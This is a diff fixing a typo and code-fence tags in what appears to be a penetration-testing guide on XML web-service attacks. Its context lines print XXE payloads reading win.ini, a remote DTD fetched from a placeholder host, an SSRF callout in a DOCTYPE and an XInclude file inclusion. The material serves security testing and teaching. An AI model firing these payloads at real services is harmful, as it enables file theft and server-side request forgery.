@@ -60,7 +60,7 @@ The most important step is to follow the succession of requests closely.
 - Do the passive scans of Burp or ZAP provide you with new ideas?
 
 
-Time to dig depper
+Time to dig deeper
 ------------------
 Once you know how every thing is working, it is time to look for spots to 
 break it. First of all take a look a classical injection attacks like:
@@ -84,7 +84,7 @@ work on the later - ensure that the modified parameter is either reflected
 or that you know the appropriate service method to retrieve the resolved
 reference. Here is a short example:
 
-```XML
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]>
 <updateProfile>
@@ -100,7 +100,7 @@ DTD are an old way of defining and injecting elements. Basically they can
 be abused the same way as the external entities described above. In the 
 following example loading of an additional file is presented:
 
-```XML
+```xml
 <!ENTITY % an-element "<!ELEMENT mytag (subtag)>">
 <!ENTITY % remote-dtd SYSTEM "http://ip_of_your_choice/some-file.dtd">
 
@@ -118,7 +118,7 @@ definition you like. Keep in mind that by changing that you can include
 all tags you previously defined in your schema definition. Here is a simple
 example:
 
-```XML
+```xml
 <roottag xmlns="http://schema/namespace/primary"
 xmlns:secondaryns="http://schema/namespace/secondary"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -142,7 +142,7 @@ Besides calling home to URLs of your choice you can as well try to include
 files of your choice. However it hardly works with current XML parsers and 
 their default configuration.
 
-```XML
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://your_servers_ip_addess?ssrf">
 <roottag>not an entity attack!</roottag>
@@ -159,7 +159,7 @@ also for the attacker. Often you can simply extend the name space
 definitions and the XInclude. If the schema validation is not to strict
 you may add any file you like to the response.
 
-```XML
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <document xmlns:xi="http://www.w3.org/2001/XInclude">
 	<content>Very special content that is protected by copyright.</content>
